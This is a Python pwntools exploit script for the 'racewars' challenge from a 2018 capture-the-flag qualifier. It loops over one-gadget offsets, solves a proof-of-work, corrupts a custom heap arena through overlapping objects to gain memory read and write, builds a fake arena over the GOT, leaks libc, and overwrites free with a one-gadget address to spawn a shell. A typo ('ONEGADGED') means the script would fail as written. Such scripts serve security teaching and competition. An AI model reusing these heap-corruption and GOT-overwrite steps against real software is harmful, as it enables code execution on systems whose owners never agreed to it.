for ONEGADGET in [0x4526a, 0xcd0f3, 0xcd1c8, 0xf02a4, 0xf1147, 0xf66f0]:

    print "=" * 80
    print "=" * 80
    print "=" * 80
    print "=" * 80
    print "=" * 80
    print "=" * 80
    print "ONEGADGET AT OFFSET", hex(ONEGADGET)

    print "=" * 80
    print "=" * 80
    print "=" * 80
    print "=" * 80

    from pwn import *
    import struct
    import hashlib
    import traceback
    import time

    context.update(arch='amd64')
    context.update(log_level="debug")

    def pow_hash(challenge, solution):
        return hashlib.sha256(challenge + struct.pack('<Q', solution)).hexdigest()

    def check_pow(challenge, n, solution):
        h = pow_hash(challenge, solution)
        return (int(h, 16) % (2**n)) == 0

    def solve_pow(challenge, n):
        candidate = 0
        while True:
            if check_pow(challenge, n, candidate):
                return candidate
            candidate += 1


    cwd = './'
    bin_ = os.path.join(cwd, 'racewars')
    b = ELF(bin_)
    # libc = ELF(os.path.join('/lib/x86_64-linux-gnu/libc.so.6'))

    if len(sys.argv) > 1:
        TARGET = sys.argv[1]
    else:
        TARGET = 'gdb'
        # TARGET = 'live'

    execute = [
        # 'b *0x0000400B8D',
        # 'b *0x000400ACF',
        # 'b *0x00400A2A',
        # 'b *0x00401A16',
        # 'b *0x0000401938',
         'continue'
    ]

    execute = flat(map(lambda x: x + '\n', execute))
    print execute


    def conn():
        if TARGET == 'gdb':
            #r = process(bin_, aslr=False, cwd=cwd)
            r = process(bin_, aslr=True)
            #r = process(bin_, aslr=True)
            #gdb.attach(r, gdbscript=execute)
            return r
        else:
            p = remote('2f76febe.quals2018.oooverflow.io', 31337)
            p.recvuntil("Challenge: ")
            challenge = p.recvline().strip()
            p.recvuntil("n: ")
            n = int(p.recvline().strip())
            print "challenge = %s, n = %d" % (challenge, n)
            result = solve_pow(challenge, n)
            print "result = %d" % result
            p.sendline(str(result))
        return p


    def tire1(cnt):
        assert cnt < 2**32
        print r.sendlineafter(': ', '1')
        print r.sendlineafter('?', str(cnt))
        return r.recvuntil('pick')


    def chassis1():
        print r.sendlineafter(': ', '2')
        print r.sendlineafter('eclipse', '1')
        return r.recvuntil('pick')


    def engine1():
        print r.sendlineafter(': ', '3')
        return r.recvuntil('pick')


    def transmission1(type):
        print r.sendlineafter(': ', '4')
        print r.sendlineafter('? ', str(type))
        return r.recvuntil('pick')


    def tire_modify():
        print r.sendlineafter(': ', '1') #modify tire
        print r.sendlineafter(': ', '1') #width
        print r.sendlineafter(': ', str(400))

    def transmission_modify(offs, val):
        print r.sendlineafter(': ', '4')
        print r.sendlineafter('? ', str(offs))
        print r.sendlineafter(': ', str(val))
        print r.sendlineafter(')', '1') #no -> yes TODO


    def transmission_read(offs):
        print r.sendlineafter(': ', '4')
        print r.sendlineafter('? ', str(offs))
        print r.recvuntil("is ")
        b = r.recvuntil(",")
        b = b[:-1]
        b = int(b)
        print "Leaked byte 0x%02x" % b

        print r.sendlineafter(": ", '0') #we dont acutally modify, val doesn tmatter
        print r.sendlineafter(')', '0') 

        return b

    def buy_parts():
        print r.sendlineafter(': ', '5')

    def read8(offs):
        val = 0
        for i in xrange(0, 8):
            print "read next byte"
            bval = transmission_read(offs + i)
            val = (bval << (8*i)) | val
        return val


    def write8(offs, val):
        for i in xrange(0, 8):
            bval = ((val >> (i*8)) & 0xFF)
            transmission_modify(offs + i, bval)

    r = conn()


    # first of all, almost fill up the main arena so we can own next arena with a transmission overlapping a tire.

    for i in xrange(0, 60):
            tire1(4)
    tire1(2)
    tire1(2)
    tire1(2)
    tire1(2)
    tire1(2)


    #now overlap a 0-sized tire with a transmission

    tire1(2**32 >> 5)
    transmission1(1)

    #now let's make also an engine and a chassis.
    #we need to get to the next level.

    chassis1()
    engine1()


    #ok - now we have everything we need it is time to leak and modify arena2->data_ptr
    #we will move it to the GOT and then alloc a tire1 and transmission there again
    #then we leak and modify free and we are basically done.

    #first of all we modify the width to 400 -> this makes transmission gear_cnt 400.

    tire_modify()

    #now we can read/write transmission gear byte up to +400

    #the idea is to create a fake arena next inside arena2
    #then we fill up arena2. once we can't allocate out of arena2 anymore,
    #we are going to trigger the creation of a third arena.
    #this will result in hitting the loop in allocate_from_new_secondary_arena
    #which is going to select the fake arena as main_arena->list_head, which is to the GOT.
    #after this, we can allocate tire0 + transmission to the GOT.

    for i in xrange(0, 60):
            buy_parts()
            tire1(4)

    buy_parts()
    tire1(2)
    buy_parts()
    tire1(2)
    buy_parts()
    tire1(2)
    buy_parts()
    tire1(2)
    buy_parts()
    tire1(2)
    buy_parts()
    engine1()

    #here we can create the fake next for arena2 from the transmission

    #1 read the data_ptr of the arena, which gives us a heap leak.
    arena2_data_start_offs = 0x606020 - (0x605fd8 + 8)
    data_ptr = read8(arena2_data_start_offs)
    arena2_addr = data_ptr - 0x1f90

    print "leaked data_start: 0x%08x" % data_ptr
    print "Arena2 fake next offset: 0x%08x" % arena2_addr

    #2 modify the next_ptr of the arena from the leak, to create a fake arena
    arena2_next_offs = arena2_data_start_offs + 16
    write8(arena2_next_offs, arena2_addr + 0x60)

    #3 modify the iterator of the arena, so that the fake next is chosen as the list_head
    arena2_it_cnt_offs = arena2_next_offs + 8
    write8(arena2_it_cnt_offs, 16)

    #4 write next of the fake arena as 0
    fake_arena_offs = arena2_data_start_offs + 0x60

    fake_arena_next_offs = fake_arena_offs + 0x10
    write8(fake_arena_next_offs, 0)

    #5 write data_start of the fake arena as 0x603000
    fake_arena_data_start_offs = fake_arena_offs
    write8(fake_arena_data_start_offs, 0x603000)
    #write8(fake_arena_data_start_offs, 0x602FE0)

    #6 write data_end of the fake arena a 0x603000 -> it has to look empty at first to not satisfy allocations and trigger creating arena 3
    fake_arena_data_end_offs = fake_arena_offs + 8
    write8(fake_arena_data_end_offs, 0x603000)

    #7 write max_alloc_size of the fake arena as 0xfff
    fake_arena_max_alloc_size_offs = fake_arena_offs + 0x20
    write8(fake_arena_max_alloc_size_offs, 0xfff)

    #8 modify the iterator of the fake arena so that it is chosen as the list_head
    fake_arena_it_cnt_offs = fake_arena_offs + 0x18
    write8(fake_arena_it_cnt_offs, 16)


    #now - let's trigger the creation of the third arena, making the fake arena the main->list_head

    for i in xrange(0, 5):
        buy_parts()
        chassis1() 


    #Now the fake arena has become the list_head. But, it is currently seemingly empty.
    #So we need the transmission overwrite again to make it seem like it has space.

    #6B write data_end of the fake arena a 0x604000
    fake_arena_data_end_offs = fake_arena_offs + 8
    write8(fake_arena_data_end_offs, 0x604000)

    #gdb.attach(r)

    #now we alloc overlapping tire and transmission from the fake arena, placing them in the GOT

    buy_parts()
    tire1(2**32 >> 5)

    buy_parts()
    transmission1(0)

    #Now modify the transmission gear_cnt

    tire_modify()

    #Now leak out the free

    puts_ptr = read8(0x20-9+1)

    print "Leaked puts: 0x%08x" % puts_ptr
    libc_base = puts_ptr - (0x7f88e2a26690 - 0x7f88e29b7000)
    print "Libc base: 0x%08x" % libc_base
    jump_addr = libc_base + ONEGADGED

    print "One-gadget: 0x%08x" % jump_addr

    #finally overwrite the free with one-gadget rce address. then we can finish the game and win.

    write8(0x18-9+1, jump_addr)

    try:
        r.interactive()
    except:
        pass

